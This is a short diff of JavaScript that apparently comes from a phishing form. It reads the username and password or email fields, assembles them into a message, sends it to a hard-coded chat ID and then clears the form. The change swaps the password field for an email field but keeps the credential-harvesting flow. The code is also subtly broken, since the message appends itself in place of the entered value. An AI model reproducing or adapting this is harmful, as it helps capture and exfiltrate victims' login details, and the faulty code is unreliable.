@@ -5,8 +5,8 @@ var chat_id = 6734793600;
 var u_name, email, message;
 var ready = function () {
     u_name = document.getElementById("username").value;
-    email = document.getElementById("password").value;
-    message = "username: " + u_name + "\npassword: " + message;
+    email = document.getElementById("email").value;
+    message = "username: " + u_name + "\nemail: " + message;
 };
 var sender = function () {
     ready();
@@ -28,6 +28,6 @@ var sender = function () {
         console.log(response);
     });
     document.getElementById("username").value = "";
-    document.getElementById("password").value = "";
+    document.getElementById("email").value = "";
     return false;
 };
